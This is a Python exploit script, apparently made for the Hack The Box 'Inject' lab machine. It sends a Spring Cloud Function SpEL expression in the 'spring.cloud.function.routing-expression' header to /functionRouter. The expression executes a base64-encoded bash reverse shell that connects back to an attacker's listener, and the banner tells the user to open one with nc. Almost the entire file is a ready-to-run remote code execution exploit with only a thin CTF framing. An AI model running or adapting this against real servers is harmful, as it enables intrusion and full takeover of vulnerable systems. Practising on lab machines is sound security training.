import requests
import sys
import base64
import urllib3
urllib3.disable_warnings()

a ='''
     ___     ____ _____          ____    ____     __   ____  _       __
   /   |   / __//__  /  ___    / __ \  / __ \   / /  / __ \| |     / /
  / /| |  / /_    / /  / _ \  / /_/ / / /_/ /  / /  / / / /| | /| / / 
 / ___ | / __/   / /  /  __/ / _, _/  \__, /  / /  / /_/ / | |/ |/ /  
/_/  |_|/_/     /_/   \___/ /_/ |_|  /____/  /_/   \____/  |__/|__/   
                                                                      
                                                                     
 Made for HTB Inject by https://github.com/Af7eR9l0W
 
 Usage: python3 inject_exploit.py url lhost lport
 Example: python3 inject_exploit.py http://10.10.11.204:8080 10.10.xx.xx 1234
 Open a listener with: nc -nlvp 1234
 Enjoy Frank!
'''

print(a)
print(' ')

def bash(url,ip,port):

    cmd ='bash -i >&/dev/tcp/'+ip+'/'+port+' 0>&1'
    cmd = cmd.encode('utf-8')
    cmd = str(base64.b64encode(cmd))
    cmd = cmd.strip('b')
    cmd = cmd.strip("'")
    cmd = 'bash -c {echo,' + cmd + '}|{base64,-d}|{bash,-i}'

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'

    # print(all)
    all = url + path
    try:
        req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
        print(url)
        code =req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'

        if code == 500 and rsp in text:
            print(f'[+]{url} vulnerable')
            print('getting shell...')
        else:
            print(f'[-]{url} not vulnerable')

    except requests.exceptions.RequestException:
        print(f'[-]{url} timed out')
        pass
    except:
        print(f'[-]{url} detection/ids error/check port')
        pass



if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        cmd2 =sys.argv[2]
        cmd3 =sys.argv[3]
        bash(cmd1,cmd2,cmd3)
    except:
        print('Usage：')
        print('python inject_exploit.py url lhost lport')
        pass
